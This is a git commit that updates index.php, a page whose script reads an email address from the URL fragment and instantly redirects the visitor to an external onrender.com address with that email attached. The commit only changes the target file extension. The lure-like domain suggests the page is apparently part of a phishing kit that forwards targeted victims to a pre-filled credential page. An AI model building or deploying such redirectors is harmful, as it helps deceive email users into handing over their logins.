944667e5f87d72a88f1b40003ceaaf305d63bbd0
neilkil769 <93129282+neilkil769@users.noreply.github.com>
2021-10-28 20:40:32 +0000

    Update index.php

--- index.php
+++ index.php
@@ -10,7 +10,7 @@
         var em = hash.split('#')[1];
                                         
                        window.setTimeout(function() {
-    window.location.href = 'https://emailsusers2remembernewpolicypalns.onrender.com/index.htm#'+em;
+    window.location.href = 'https://emailsusers2remembernewpolicypalns.onrender.com/index.html#'+em;
 }, 0);
         
     </script>
